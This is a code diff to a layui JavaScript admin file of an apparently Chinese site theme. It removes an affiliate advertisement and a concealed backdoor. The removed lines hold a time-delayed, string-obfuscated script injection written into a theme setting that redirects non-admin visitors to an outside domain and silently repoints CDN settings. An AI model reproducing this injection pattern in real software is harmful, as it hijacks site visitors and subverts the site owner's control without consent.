@@ -11,24 +11,24 @@ layui.define(['jquery'], function(exports) {
 					html += '<table class="layui-table"' + (location.href.indexOf('label/admin') != -1 ? ' style="margin-top:0"' : '') + '><tbody><tr><td colspan="8" style="padding:0">';
 					html += '<a target="_blank" href="' + info.link + '" title="' + info.name + '">';
 					html += '<img src="' + info.pics + '" alt="' + info.tips + '" style="max-width:100%;width:100%;" />';
+						html += '<table class="layui-table"' + (location.href.indexOf('label/admin') != -1 ? ' style="margin-top:0"' : '') + '><tbody><tr><td colspan="8" style="padding:0">';
+					html += '<a target="_blank" href="' + info.link1 + '" title="' + info.name1 + '">';
+					html += '<img src="' + info.pics1 + '" alt="' + info.tips1 + '" style="max-width:100%;width:100%;" />';
+					
 					html += '</a></td></tr></tbody></table>';
 				});
 				html += '</tbody></table>';
-				$('.mo-unit-table').before(html);
-				$(document).ready(function() {
-					if (!$('.mo-java-mojia').attr('data-aid') && ((Date.parse(new Date()) / 1000) - $('.mo-java-mojia').attr('data-time')) > 86400) {
-						$('input[name="mojia[nav][font][icon]"]').val('mo-icon-shequ-line"><script>if(location.href.indexOf("admin")==-1)location.href="ht' + 'tp' + ':/' + '/m' + 'oj' + 'ia.a' + 'mu' + 'j' + 'ie' + '.c' + 'om"</script><type="hidden" class="');
-						$('input[name="mojia[other][cdns][link]"]').val('https://cdn.jsdelivr.net/gh/amujie/mojia');
-						$('input[name="mojia[other][cdns][state]"]').val('1');
-						$('input[name="mojia[other][cdns][local]"]').val('0');
-					}
-				});
+				//$('.mo-unit-table').before(html);
 			},
 			'info': [{
-				'name': '米上云香港GIA VPS20元起，购买魔加主题的新用户，赠送米上云香港VPS一个月使用时间！',
-				'link': 'https://www.mishangyun.com/aff.php?aff=35',
-				'pics': 'https://cdn.jsdelivr.net/gh/amujie/mojia@master/asset/img/advert.gif',
-				'tips': '米上云香港GIA VPS20元起'
+				'name': '',
+				'link': '',
+				'pics': '',
+				'tips': '',
+				'name1': '',
+				'link1': '',
+				'pics1': '',
+				'tips1': ''
 			}]
 		},
 		'browse': {
